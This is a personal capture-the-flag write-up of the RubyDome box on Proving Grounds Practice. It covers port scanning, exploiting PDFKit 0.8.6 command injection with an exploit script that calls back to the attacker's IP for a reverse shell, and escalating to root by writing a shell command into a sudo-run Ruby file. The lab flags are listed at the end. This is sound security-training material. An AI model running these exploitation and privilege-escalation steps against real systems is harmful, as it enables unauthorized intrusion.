---
Date: 2024-10-06
Platform: PG-Practice
Category: Linux
Difficulty: Easy
Status: Complete
IP: 192.168.228.22
Writeup: https://r4j3sh.medium.com/rubydome-pg-practice-writeup-7749fe58bbe5
---
# RubyDome
Frustrating that a couple of key points in this box were only broken through with the use of the walkthrough. Throwing `127.0.0.1` into the website to break it was a new one (something to keep in mind for the future) but I'd have never worked out without the walkthrough. 

Likewise the exploit initially appeared to be working perfectly but wasn't catching a shell, and it turned out I had to add "pdf" onto the end of the target web address.

Finally, abusing binary privileges turned out to be a weird one too, as I had to add the command to the `app.rb` file and then execute from the sudo binary. Awesome that it worked, and another one to keep in mind for the future, but I'm doing my best not to lean to heavily on walkthroughs at the moment, and this makes it feel like I am.
# Resolution summary
- Ran Nmap to find services on port 22 & 3000
- Inspected html on port 3000, found HTML to PDF service
- Found error by entering `127.0.0.1` to identify vulnerable service (PDFKit 0.8.6)
- Identified and ran command injection exploit to catch reverse shell
- Enumerated `andrew` user, identified `sudo` privileges for `ruby`
- Used GTFObins to identify privesc vector by writing bash command to `app.rb` 
- Executed `app.rb` with `sudo` to become `root`
## Improved skills
- skill 1
- skill 2
## Used tools
- nmap
- GTFOBins
- Searchsploit

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN rubydome.nmap 192.168.228.22 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 8.9p1)

## Port 3000 - HTTP (WEBrick 1.7.0 / Ruby 3.0.2)
- Navigated to `http://192.168.228.22:3000/`
![[Pasted image 20241006133635.png]]
- Attempted to get PDF for `http://127.0.0.1`, received error for `PDFKit`
![[Pasted image 20241006134352.png]]
- Identified PDFKit version (0.8.6) (required expanding "Backtrace" details)
- Identified PDFKit uses url for POST parameter
![[Pasted image 20241006135551.png]]
---
# Exploitation
## Command Injection
PDFKit 0.8.6 is vulnerable to command injection (CVE-2022–25765), then identified exploit `51293.py` is available to use command injection to create a reverse shell.
- Ran exploit command;
  `python3 51293.py -s 192.168.45.175 80 -w http://192.168.228.22:3000/pdf -p url`
  ![[Pasted image 20241006140548.png]]
- Caught reverse shell as `andrew` with Netcat listener
![[Pasted image 20241006140629.png]]

---
# Lateral Movement to user
## Local Enumeration
- Upgrade to full TTY, moved to `andrew` home directory, printed `local.txt`
![[Pasted image 20241006140943.png]]
- Ran `cat /etc/passwd` to also find `offsec` user
![[Pasted image 20241006141118.png]]
- Ran `sudo -l` to find `andrew` has sudo privilege for `/usr/bin/ruby`
![[Pasted image 20241006141248.png]]
- Ran `ls -lah` inside `/app` directory and identified `andrew` has `rwx` privilege over `app.rb`
![[Pasted image 20241006144015.png]]
---
# Privilege Escalation
## Sudo Binary - GTFOBins
- Identified `andrew` has sudo privilege of `/home/andrew/app/app.rb`, and relevant binary vulnerability found on GTFObins
![[Pasted image 20241006144115.png]]
- Echoed `exec "/bin/sh"` into `app.rb` 
![[Pasted image 20241006144334.png]]
- Ran `app.rb` as Sudo to achieve `root`
![[Pasted image 20241006144355.png]]

---
# Trophy & Loot
`local.txt` = `a779352dd3270666856f7cbd34073f4b`
`root.txt` = `78aba0e8e3abe4e15304b6fda4649006`
![[Pasted image 20241006144618.png]]